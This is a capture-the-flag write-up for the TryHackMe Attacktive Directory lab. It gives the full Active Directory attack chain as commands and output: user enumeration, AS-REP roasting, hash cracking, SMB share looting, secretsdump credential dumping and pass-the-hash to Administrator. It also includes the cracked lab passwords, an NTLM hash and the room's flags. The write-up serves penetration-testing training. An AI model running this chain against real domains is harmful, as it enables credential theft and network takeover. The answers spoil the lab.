@@ -1,0 +1,123 @@
+>>> TryHackMe
+>> Active Directory
+
+> nmap
+
+  > nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.202.8 -oN attactive
+
+    • 53/tcp   open  domain        syn-ack ttl 64 Simple DNS Plus
+    • 80/tcp   open  http          syn-ack ttl 64 Microsoft IIS httpd 10.0
+    • 135/tcp  open  msrpc         syn-ack ttl 64 Microsoft Windows RPC
+    • 139/tcp  open  netbios-ssn   syn-ack ttl 64 Microsoft Windows netbios-ssn
+    • 445/tcp  open  microsoft-ds? syn-ack ttl 64
+    • 3389/tcp open  ms-wbt-server syn-ack ttl 64 Microsoft Terminal Services
+
+After fuzzing and finding nothing, we focus on port 445.
+
+We use the tool crackmapexec to audit port 445.
+
+> crackmapexec smb 10.10.202.8
+
+  • SMB         10.10.202.8     445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name: ATTACKTIVEDIREC) (domain: spookysec.local) (signing: True) (SMBv1: False)
+
+This provides machine data, so we proceed to use kerbrute to brute force enumerate users and passwords.
+
+> python3 kerbrute.py -users userlist.txt -passwords passwordlist.txt -domain spookysec.local -t 100
+
+  [*] Blocked/Disabled user => guest
+  [*] Valid user => svc-admin [NOT PREAUTH]
+  [*] Valid user => james
+  [*] Valid user => James
+  [*] Valid user => robin
+  [*] Valid user => darkstar
+  [*] Valid user => administrator
+  [*] Valid user => backup
+  [*] Valid user => paradox
+  [*] Valid user => JAMES
+  [*] Valid user => Robin
+  [*] Blocked/Disabled user => Guest
+  [*] Valid user => Administrator
+  [*] Valid user => Darkstar
+
+With the user "Valid user => svc-admin [NOT PREAUTH]," we can request a ticket from the server to log in as "svc-admin" using "impacket-getNPUsers."
+
+> impacket-GetNPUsers spookysec.local/svc-admin -no-pass
+
+Response:
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:769862dd6291e7ec05de2d3aa29907e5$7560d67f4dd9f0b5e729c9c40157a23682d8f426e5b8981b8625f3cc35b2f2736621875004357d4236dcdf62f77c01df958340c1b6ddd670ade974bfc209d76e10611627261fdbfb4852598d1ef9e8009092b484e7dc8bf7c18cb0783f788160b6cd8f59497d17871a2630badf38dde08d6944102fc7db55446932ca212a48f128d5316737ee7e07ab4a5f8a0d885c88d46c43522378227e9e5e3e0fb18cce1aed67e70cc84ae6dece426dd3b627dbb030aff623e703673b74a4e844ad6bbb9a99a8e35943c0f4840579ca3c7eb4b78da3b62159b872784acef814ba659b469223d68affa25cd84f48c2089fa9ebc8e3f611
+
+Save it as a hash
+
+> nano hash
+
+769862dd6291e7ec05de2d3aa29907e5$7560d67f4dd9f0b5e729c9c40157a23682d8f426e5b8981b8625f3cc35b2f2736621875004357d4236dcdf62f77c01df958340c1b6ddd670ade974bfc209d76e10611627261fdbfb4852598d1ef9e8009092b484e7dc8bf7c18cb0783f788160b6cd8f59497d17871a2630badf38dde08d6944102fc7db55446932ca212a48f128d5316737ee7e07ab4a5f8a0d885c88d46c43522378227e9e5e3e0fb18cce1aed67e70cc84ae6dece426dd3b627dbb030aff623e703673b74a4e844ad6bbb9a99a8e35943c0f4840579ca3c7eb4b78da3b62159b872784acef814ba659b469223d68affa25cd84f48c2089fa9ebc8e3f611
+
+Crack the hash
+
+> john --wordlist=/usr/share/wordlists/rockyou.txt hash  
+
+  management2005
+
+Now we have the password for "svc-admin."
+
+Next, we check the shared resources of "svc-admin."
+
+> smbclient -L spookysec.local --user svc-admin --password management2005
+
+  Sharename       Type      Comment
+  ---------       ----      -------
+  ADMIN$          Disk      Remote Admin
+  backup          Disk      
+  C$              Disk      Default share
+  IPC$            IPC       Remote IPC
+  NETLOGON        Disk      Logon server share 
+  SYSVOL          Disk      Logon server share 
+
+We find that "backup" does not require higher permissions. We enter with "smbclient" as follows:
+
+> smbclient  \\\\10.10.58.119\\backup --user svc-admin --password management2005
+
+Once inside, we find "backup_credentials.txt" and proceed to download it.
+
+  > ls
+    • backup_credentials.txt
+  > get backup_credentials.txt
+
+  > quit
+
+Let's read to see what we find.
+
+> cat backup_credentials.txt
+  • YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw  
+
+We find a base64-encoded hash, so we proceed to decode it.
+
+> echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw   | base64 -d
+  • backup@spookysec.local:backup2517860 
+
+Now that we have a valid username and password, we can dump the password database with the following command.
+
+> impacket-secretsdump -just-dc backup@spookysec.local
+
+  • Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+
+We proceed to pass the hash of the "administrator" user with the following command.
+
+> impacket-psexec Administrator:@spookysec.local -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+
+Now we are inside the victim machine, creating a remote directory and being "Administrator."
+
+> cd Administrator
+> cd Desktop
+> type root.txt
+  TryHackMe{4ctiveD1rectoryM4st3r}
+> cd svc-admin
+> cd Desktop
+> type user.txt.txt
+  TryHackMe{K3rb3r0s_Pr3_4uth}
+> cd Backup
+> cd Desktop
+> type PrivEsc.txt
+  TryHackMe{B4ckM3UpSc0tty!}"
